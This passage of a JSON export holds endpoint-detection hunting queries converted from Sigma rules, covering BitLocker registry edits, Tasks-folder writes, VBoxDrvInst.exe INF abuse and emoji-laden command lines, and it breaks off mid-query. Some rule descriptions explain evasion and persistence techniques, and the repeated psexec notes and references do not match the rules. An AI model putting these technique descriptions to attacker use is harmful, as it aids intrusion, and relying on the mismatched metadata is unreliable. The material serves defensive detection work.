            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.cmdline contains \"\\Event Viewer\\RecentViews\" or tgt.process.cmdline contains \"\\EventV~1\\RecentViews\") and tgt.process.cmdline contains \">\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1007
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects suspicious addition to BitLocker related registry keys via the reg.exe utility",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1486"
            ],
            "name": "Suspicious Reg Add BitLocker",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.cmdline contains \"REG\" and tgt.process.cmdline contains \"ADD\" and tgt.process.cmdline contains \"\\SOFTWARE\\Policies\\Microsoft\\FVE\" and tgt.process.cmdline contains \"/v\" and tgt.process.cmdline contains \"/f\") and (tgt.process.cmdline contains \"EnableBDEWithNoTPM\" or tgt.process.cmdline contains \"UseAdvancedStartup\" or tgt.process.cmdline contains \"UseTPM\" or tgt.process.cmdline contains \"UseTPMKey\" or tgt.process.cmdline contains \"UseTPMKeyPIN\" or tgt.process.cmdline contains \"RecoveryKeyMessageSource\" or tgt.process.cmdline contains \"UseTPMPIN\" or tgt.process.cmdline contains \"RecoveryKeyMessage\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1008
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "The Tasks folder in system32 and syswow64 are globally writable paths.\nAdversaries can take advantage of this and load or influence any script hosts or ANY .NET Application\nin Tasks to load and execute a custom assembly into cscript, wscript, regsvr32, mshta, eventvwr\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1574"
            ],
            "name": "Tasks Folder Evasion",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.cmdline contains \"echo \" or tgt.process.cmdline contains \"copy \" or tgt.process.cmdline contains \"type \" or tgt.process.cmdline contains \"file createnew\") and (tgt.process.cmdline contains \" C:\\Windows\\System32\\Tasks\\\" or tgt.process.cmdline contains \" C:\\Windows\\SysWow64\\Tasks\\\"))) | columns tgt.process.cmdline,ParentProcess",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1009
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detect VBoxDrvInst.exe run with parameters allowing processing INF file.\nThis allows to create values in the registry and install drivers.\nFor example one could use this technique to obtain persistence via modifying one of Run or RunOnce registry keys\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1112"
            ],
            "name": "Suspicious VBoxDrvInst.exe Parameters",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.image.path contains \"\\VBoxDrvInst.exe\" and (tgt.process.cmdline contains \"driver\" and tgt.process.cmdline contains \"executeinf\"))) | columns ComputerName,tgt.process.user,tgt.process.cmdline,src.process.cmdline",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1010
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the usage of emojis in the command line, this could be a sign of potential defense evasion activity.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [],
            "name": "Potential Defense Evasion Activity Via Emoji Usage In CommandLine - 1",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \"\ud83d\ude00\" or tgt.process.cmdline contains \"\ud83d\ude03\" or tgt.process.cmdline contains \"\ud83d\ude04\" or tgt.process.cmdline contains \"\ud83d\ude01\" or tgt.process.cmdline contains \"\ud83d\ude06\" or tgt.process.cmdline contains \"\ud83d\ude05\" or tgt.process.cmdline contains \"\ud83d\ude02\" or tgt.process.cmdline contains \"\ud83e\udd23\" or tgt.process.cmdline contains \"\ud83e\udd72\" or tgt.process.cmdline contains \"\ud83e\udd79\" or tgt.process.cmdline contains \"\u263a\ufe0f\" or tgt.process.cmdline contains \"\ud83d\ude0a\" or tgt.process.cmdline contains \"\ud83d\ude07\" or tgt.process.cmdline contains \"\ud83d\ude42\" or tgt.process.cmdline contains \"\ud83d\ude43\" or tgt.process.cmdline contains \"\ud83d\ude09\" or tgt.process.cmdline contains \"\ud83d\ude0c\" or tgt.process.cmdline contains \"\ud83d\ude0d\" or tgt.process.cmdline contains \"\ud83e\udd70\" or tgt.process.cmdline contains \"\ud83d\ude18\" or tgt.process.cmdline contains \"\ud83d\ude17\" or tgt.process.cmdline contains \"\ud83d\ude19\" or tgt.process.cmdline contains \"\ud83d\ude1a\" or tgt.process.cmdline contains \"\ud83d\ude0b\" or tgt.process.cmdline contains \"\ud83d\ude1b\" or tgt.process.cmdline contains \"\ud83d\ude1d\" or tgt.process.cmdline contains \"\ud83d\ude1c\" or tgt.process.cmdline contains \"\ud83e\udd2a\" or tgt.process.cmdline contains \"\ud83e\udd28\" or tgt.process.cmdline contains \"\ud83e\uddd0\" or tgt.process.cmdline contains \"\ud83e\udd13\" or tgt.process.cmdline contains \"\ud83d\ude0e\" or tgt.process.cmdline contains \"\ud83e\udd78\" or tgt.process.cmdline contains \"\ud83e\udd29\" or tgt.process.cmdline contains \"\ud83e\udd73\" or tgt.process.cmdline contains \"\ud83d\ude0f\" or tgt.process.cmdline contains \"\ud83d\ude12\" or tgt.process.cmdline contains \"\ud83d\ude1e\" or tgt.process.cmdline contains \"\ud83d\ude14\" or tgt.process.cmdline contains \"\ud83d\ude1f\" or tgt.process.cmdline contains \"\ud83d\ude15\" or tgt.process.cmdline contains \"\ud83d\ude41\" or tgt.process.cmdline contains \"\u2639\ufe0f\" or tgt.process.cmdline contains \"\ud83d\ude23\" or tgt.process.cmdline contains \"\ud83d\ude16\" or tgt.process.cmdline contains \"\ud83d\ude2b\" or tgt.process.cmdline contains \"\ud83d\ude29\" or tgt.process.cmdline contains \"\ud83e\udd7a\" or tgt.process.cmdline contains \"\ud83d\ude22\" or tgt.process.cmdline contains \"\ud83d\ude2d\" or tgt.process.cmdline contains \"\ud83d\ude2e\u200d\ud83d\udca8\" or tgt.process.cmdline contains \"\ud83d\ude24\" or tgt.process.cmdline contains \"\ud83d\ude20\" or tgt.process.cmdline contains \"\ud83d\ude21\" or tgt.process.cmdline contains \"\ud83e\udd2c\" or tgt.process.cmdline contains \"\ud83e\udd2f\" or tgt.process.cmdline contains \"\ud83d\ude33\" or tgt.process.cmdline contains \"\ud83e\udd75\" or tgt.process.cmdline contains \"\ud83e\udd76\" or tgt.process.cmdline contains \"\ud83d\ude31\" or tgt.process.cmdline contains \"\ud83d\ude28\" or tgt.process.cmdline contains \"\ud83d\ude30\" or tgt.process.cmdline contains \"\ud83d\ude25\" or tgt.process.cmdline contains \"\ud83d\ude13\" or tgt.process.cmdline contains \"\ud83e\udee3\" or tgt.process.cmdline contains \"\ud83e\udd17\" or tgt.process.cmdline contains \"\ud83e\udee1\" or tgt.process.cmdline contains \"\ud83e\udd14\" or tgt.process.cmdline contains \"\ud83e\udee2\" or tgt.process.cmdline contains \"\ud83e\udd2d\" or tgt.process.cmdline contains \"\ud83e\udd2b\" or tgt.process.cmdline contains \"\ud83e\udd25\" or tgt.process.cmdline contains \"\ud83d\ude36\" or tgt.process.cmdline contains \"\ud83d\ude36\u200d\ud83c\udf2b\ufe0f\" or tgt.process.cmdline contains \"\ud83d\ude10\" or tgt.process.cmdline contains \"\ud83d\ude11\" or tgt.process.cmdline contains \"\ud83d\ude2c\" or tgt.process.cmdline contains \"\ud83e\udee0\" or tgt.process.cmdline contains \"\ud83d\ude44\" or tgt.process.cmdline contains \"\ud83d\ude2f\" or tgt.process.cmdline contains \"\ud83d\ude26\" or tgt.process.cmdline contains \"\ud83d\ude27\" or tgt.process.cmdline contains \"\ud83d\ude2e\" or tgt.process.cmdline contains \"\ud83d\ude32\" or tgt.process.cmdline contains \"\ud83e\udd71\" or tgt.process.cmdline contains \"\ud83d\ude34\" or tgt.process.cmdline contains \"\ud83e\udd24\" or tgt.process.cmdline contains \"\ud83d\ude2a\" or tgt.process.cmdline contains \"\ud83d\ude35\" or tgt.process.cmdline contains \"\ud83d\ude35\u200d\ud83d\udcab\" or tgt.process.cmdline contains \"\ud83e\udee5\" or tgt.process.cmdline contains \"\ud83e\udd10\" or tgt.process.cmdline contains \"\ud83e\udd74\" or tgt.process.cmdline contains \"\ud83e\udd22\" or tgt.process.cmdline contains \"\ud83e\udd2e\" or tgt.process.cmdline contains \"\ud83e\udd27\" or tgt.process.cmdline contains \"\ud83d\ude37\" or tgt.process.cmdline contains \"\ud83e\udd12\" or tgt.process.cmdline contains \"\ud83e\udd15\" or tgt.process.cmdline contains \"\ud83e\udd11\" or tgt.process.cmdline contains \"\ud83e\udd20\" or tgt.process.cmdline contains \"\ud83d\ude08\" or tgt.process.cmdline contains \"\ud83d\udc7f\" or tgt.process.cmdline contains \"\ud83d\udc79\" or tgt.process.cmdline contains \"\ud83d\udc7a\" or tgt.process.cmdline contains \"\ud83e\udd21\" or tgt.process.cmdline contains \"\ud83d\udca9\" or tgt.process.cmdline contains \"\ud83d\udc7b\" or tgt.process.cmdline contains \"\ud83d\udc80\" or tgt.process.cmdline contains \"\u2620\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc7d\" or tgt.process.cmdline contains \"\ud83d\udc7e\" or tgt.process.cmdline contains \"\ud83e\udd16\" or tgt.process.cmdline contains \"\ud83c\udf83\" or tgt.process.cmdline contains \"\ud83d\ude3a\" or tgt.process.cmdline contains \"\ud83d\ude38\" or tgt.process.cmdline contains \"\ud83d\ude39\" or tgt.process.cmdline contains \"\ud83d\ude3b\" or tgt.process.cmdline contains \"\ud83d\ude3c\" or tgt.process.cmdline contains \"\ud83d\ude3d\" or tgt.process.cmdline contains \"\ud83d\ude40\" or tgt.process.cmdline contains \"\ud83d\ude3f\" or tgt.process.cmdline contains \"\ud83d\ude3e\" or tgt.process.cmdline contains \"\ud83d\udc4b\" or tgt.process.cmdline contains \"\ud83e\udd1a\" or tgt.process.cmdline contains \"\ud83d\udd90\" or tgt.process.cmdline contains \"\u270b\" or tgt.process.cmdline contains \"\ud83d\udd96\" or tgt.process.cmdline contains \"\ud83d\udc4c\" or tgt.process.cmdline contains \"\ud83e\udd0c\" or tgt.process.cmdline contains \"\ud83e\udd0f\" or tgt.process.cmdline contains \"\u270c\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udd1e\" or tgt.process.cmdline contains \"\ud83e\udef0\" or tgt.process.cmdline contains \"\ud83e\udd1f\" or tgt.process.cmdline contains \"\ud83e\udd18\" or tgt.process.cmdline contains \"\ud83e\udd19\" or tgt.process.cmdline contains \"\ud83e\udef5\" or tgt.process.cmdline contains \"\ud83e\udef1\" or tgt.process.cmdline contains \"\ud83e\udef2\" or tgt.process.cmdline contains \"\ud83e\udef3\" or tgt.process.cmdline contains \"\ud83e\udef4\" or tgt.process.cmdline contains \"\ud83d\udc48\" or tgt.process.cmdline contains \"\ud83d\udc49\" or tgt.process.cmdline contains \"\ud83d\udc46\" or tgt.process.cmdline contains \"\ud83d\udd95\" or tgt.process.cmdline contains \"\ud83d\udc47\" or tgt.process.cmdline contains \"\u261d\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc4d\" or tgt.process.cmdline contains \"\ud83d\udc4e\" or tgt.process.cmdline contains \"\u270a\" or tgt.process.cmdline contains \"\ud83d\udc4a\" or tgt.process.cmdline contains \"\ud83e\udd1b\" or tgt.process.cmdline contains \"\ud83e\udd1c\" or tgt.process.cmdline contains \"\ud83d\udc4f\" or tgt.process.cmdline contains \"\ud83e\udef6\" or tgt.process.cmdline contains \"\ud83d\ude4c\" or tgt.process.cmdline contains \"\ud83d\udc50\" or tgt.process.cmdline contains \"\ud83e\udd32\" or tgt.process.cmdline contains \"\ud83e\udd1d\" or tgt.process.cmdline contains \"\ud83d\ude4f\" or tgt.process.cmdline contains \"\u270d\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udcaa\" or tgt.process.cmdline contains \"\ud83e\uddbe\" or tgt.process.cmdline contains \"\ud83e\uddb5\" or tgt.process.cmdline contains \"\ud83e\uddbf\" or tgt.process.cmdline contains \"\ud83e\uddb6\" or tgt.process.cmdline contains \"\ud83d\udc63\" or tgt.process.cmdline contains \"\ud83d\udc42\" or tgt.process.cmdline contains \"\ud83e\uddbb\" or tgt.process.cmdline contains \"\ud83d\udc43\" or tgt.process.cmdline contains \"\ud83e\udec0\" or tgt.process.cmdline contains \"\ud83e\udec1\" or tgt.process.cmdline contains \"\ud83e\udde0\" or tgt.process.cmdline contains \"\ud83e\uddb7\" or tgt.process.cmdline contains \"\ud83e\uddb4\" or tgt.process.cmdline contains \"\ud83d\udc40\" or tgt.process.cmdline contains \"\ud83d\udc41\" or tgt.process.cmdline contains \"\ud83d\udc45\" or tgt.process.cmdline contains \"\ud83d\udc44\" or tgt.process.cmdline contains \"\ud83e\udee6\" or tgt.process.cmdline contains \"\ud83d\udc8b\" or tgt.process.cmdline contains \"\ud83e\ude78\" or tgt.process.cmdline contains \"\ud83d\udc76\" or tgt.process.cmdline contains \"\ud83d\udc67\" or tgt.process.cmdline contains \"\ud83e\uddd2\" or tgt.process.cmdline contains \"\ud83d\udc66\" or tgt.process.cmdline contains \"\ud83d\udc69\" or tgt.process.cmdline contains \"\ud83e\uddd1\" or tgt.process.cmdline contains \"\ud83d\udc68\" or tgt.process.cmdline contains \"\ud83d\udc69\u200d\ud83e\uddb1\" or tgt.process.cmdline contains \"\ud83e\uddd1\u200d\ud83e\uddb1\" or tgt.process.cmdline contains \"\ud83d\udc68\u200d\ud83e\uddb1\" or tgt.process.cmdline contains \"\ud83d\udc69\u200d\ud83e\uddb0\" or tgt.process.cmdline contains \"\ud83e\uddd1\u200d\ud83e\uddb0\" or tgt.process.cmdline contains \"\ud83d\udc68\u200d\ud83e\uddb0\" or tgt.process.cmdline contains \"\ud83d\udc71\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc71\" or tgt.process.cmdline contains \"\ud83d\udc71\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc69\u200d\ud83e\uddb3\" or tgt.process.cmdline contains \"\ud83e\uddd1\u200d\ud83e\uddb3\" or tgt.process.cmdline contains \"\ud83d\udc68\u200d\ud83e\uddb3\" or tgt.process.cmdline contains \"\ud83d\udc69\u200d\ud83e\uddb2\" or tgt.process.cmdline contains \"\ud83e\uddd1\u200d\ud83e\uddb2\" or tgt.process.cmdline contains \"\ud83d\udc68\u200d\ud83e\uddb2\" or tgt.process.cmdline contains \"\ud83e\uddd4\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddd4\" or tgt.process.cmdline contains \"\ud83e\uddd4\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc75\" or tgt.process.cmdline contains \"\ud83e\uddd3\" or tgt.process.cmdline contains \"\ud83d\udc74\" or tgt.process.cmdline contains \"\ud83d\udc72\" or tgt.process.cmdline contains \"\ud83d\udc73\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc73\" or tgt.process.cmdline contains \"\ud83d\udc73\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddd5\" or tgt.process.cmdline contains \"\ud83d\udc6e\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc6e\" or tgt.process.cmdline contains \"\ud83d\udc6e\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc77\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc77\" or tgt.process.cmdline contains \"\ud83d\udc77\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc82\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc82\" or tgt.process.cmdline contains \"\ud83d\udc82\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udd75\ufe0f\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udd75\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udd75\ufe0f\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc69\u200d\u2695\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddd1\u200d\u2695\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc68\u200d\u2695\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc69\u200d\ud83c\udf3e\" or tgt.process.cmdline contains \"\ud83e\uddd1\u200d\ud83c\udf3e\" or tgt.process.cmdline contains \"\ud83d\udc68\u200d\ud83c\udf3e\" or tgt.process.cmdline contains \"\ud83d\udc69\u200d\ud83c\udf73\" or tgt.process.cmdline contains \"\ud83e\uddd1\u200d\ud83c\udf73\" or tgt.process.cmdline contains \"\ud83d\udc68\u200d\ud83c\udf73\" or tgt.process.cmdline contains \"\ud83d\udc69\u200d\ud83c\udf93\" or tgt.process.cmdline contains \"\ud83e\uddd1\u200d\ud83c\udf93\" or tgt.process.cmdline contains \"\ud83d\udc68\u200d\ud83c\udf93\" or tgt.process.cmdline contains \"\ud83d\udc69\u200d\ud83c\udfa4\" or tgt.process.cmdline contains \"\ud83e\uddd1\u200d\ud83c\udfa4\" or tgt.process.cmdline contains \"\ud83d\udc68\u200d\ud83c\udfa4\" or tgt.process.cmdline contains \"\ud83d\udc69\u200d\ud83c\udfeb\" or tgt.process.cmdline contains \"\ud83e\uddd1\u200d\ud83c\udfeb\" or tgt.process.cmdline contains \"\ud83d\udc68\u200d\ud83c\udfeb\" or tgt.process.cmdline contains \"\ud83d\udc69\u200d\ud83c\udfed\" or tgt.process.cmdline contains \"\ud83e\uddd1\u200d\ud83c\udfed\" or tgt.process.cmdline contains \"\ud83d\udc68\u200d\ud83c\udfed\" or tgt.process.cmdline contains \"\ud83d\udc69\u200d\ud83d\udcbb\" or tgt.process.cmdline contains \"\ud83e\uddd1\u200d\ud83d\udcbb\" or tgt.process.cmdline contains \"\ud83d\udc68\u200d\ud83d\udcbb\" or tgt.process.cmdline contains \"\ud83d\udc69\u200d\ud83d\udcbc\" or tgt.process.cmdline contains \"\ud83e\uddd1\u200d\ud83d\udcbc\" or tgt.process.cmdline contains \"\ud83d\udc68\u200d\ud83d\udcbc\" or tgt.process.cmdline contains \"\ud83d\udc69\u200d\ud83d\udd27\" or tgt.process.cmdline contains \"\ud83e\uddd1\u200d\ud83d\udd27\" or tgt.process.cmdline contains \"\ud83d\udc68\u200d\ud83d\udd27\" or tgt.process.cmdline contains \"\ud83d\udc69\u200d\ud83d\udd2c\" or tgt.process.cmdline contains \"\ud83e\uddd1\u200d\ud83d\udd2c\" or tgt.process.cmdline contains \"\ud83d\udc68\u200d\ud83d\udd2c\" or tgt.process.cmdline contains \"\ud83d\udc69\u200d\ud83c\udfa8\" or tgt.process.cmdline contains \"\ud83e\uddd1\u200d\ud83c\udfa8\" or tgt.process.cmdline contains \"\ud83d\udc68\u200d\ud83c\udfa8\" or tgt.process.cmdline contains \"\ud83d\udc69\u200d\ud83d\ude92\" or tgt.process.cmdline contains \"\ud83e\uddd1\u200d\ud83d\ude92\" or tgt.process.cmdline contains \"\ud83d\udc68\u200d\ud83d\ude92\" or tgt.process.cmdline contains \"\ud83d\udc69\u200d\u2708\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddd1\u200d\u2708\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc68\u200d\u2708\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc69\u200d\ud83d\ude80\" or tgt.process.cmdline contains \"\ud83e\uddd1\u200d\ud83d\ude80\" or tgt.process.cmdline contains \"\ud83d\udc68\u200d\ud83d\ude80\" or tgt.process.cmdline contains \"\ud83d\udc69\u200d\u2696\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddd1\u200d\u2696\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc68\u200d\u2696\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc70\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc70\" or tgt.process.cmdline contains \"\ud83d\udc70\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udd35\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udd35\" or tgt.process.cmdline contains \"\ud83e\udd35\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc78\" or tgt.process.cmdline contains \"\ud83e\udec5\" or tgt.process.cmdline contains \"\ud83e\udd34\" or tgt.process.cmdline contains \"\ud83e\udd77\" or tgt.process.cmdline contains \"\ud83e\uddb8\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddb8\" or tgt.process.cmdline contains \"\ud83e\uddb8\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddb9\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddb9\" or tgt.process.cmdline contains \"\ud83e\uddb9\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udd36\" or tgt.process.cmdline contains \"\ud83e\uddd1\u200d\ud83c\udf84\" or tgt.process.cmdline contains \"\ud83c\udf85\" or tgt.process.cmdline contains \"\ud83e\uddd9\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddd9\" or tgt.process.cmdline contains \"\ud83e\uddd9\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udddd\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udddd\" or tgt.process.cmdline contains \"\ud83e\udddd\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udddb\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udddb\" or tgt.process.cmdline contains \"\ud83e\udddb\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udddf\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udddf\" or tgt.process.cmdline contains \"\ud83e\udddf\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddde\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddde\" or tgt.process.cmdline contains \"\ud83e\uddde\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udddc\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udddc\" or tgt.process.cmdline contains \"\ud83e\udddc\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddda\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddda\" or tgt.process.cmdline contains \"\ud83e\uddda\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddcc\" or tgt.process.cmdline contains \"\ud83d\udc7c\" or tgt.process.cmdline contains \"\ud83e\udd30\" or tgt.process.cmdline contains \"\ud83e\udec4\" or tgt.process.cmdline contains \"\ud83e\udec3\" or tgt.process.cmdline contains \"\ud83e\udd31\" or tgt.process.cmdline contains \"\ud83d\udc69\u200d\ud83c\udf7c\" or tgt.process.cmdline contains \"\ud83e\uddd1\u200d\ud83c\udf7c\" or tgt.process.cmdline contains \"\ud83d\udc68\u200d\ud83c\udf7c\" or tgt.process.cmdline contains \"\ud83d\ude47\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\ude47\" or tgt.process.cmdline contains \"\ud83d\ude47\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc81\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc81\" or tgt.process.cmdline contains \"\ud83d\udc81\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\ude45\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\ude45\" or tgt.process.cmdline contains \"\ud83d\ude45\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\ude46\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\ude46\" or tgt.process.cmdline contains \"\ud83d\ude46\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\ude4b\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\ude4b\" or tgt.process.cmdline contains \"\ud83d\ude4b\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddcf\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddcf\" or tgt.process.cmdline contains \"\ud83e\uddcf\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udd26\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udd26\" or tgt.process.cmdline contains \"\ud83e\udd26\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udd37\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udd37\" or tgt.process.cmdline contains \"\ud83e\udd37\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\ude4e\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\ude4e\" or tgt.process.cmdline contains \"\ud83d\ude4e\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\ude4d\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\ude4d\" or tgt.process.cmdline contains \"\ud83d\ude4d\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc87\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc87\" or tgt.process.cmdline contains \"\ud83d\udc87\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc86\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc86\" or tgt.process.cmdline contains \"\ud83d\udc86\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddd6\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddd6\" or 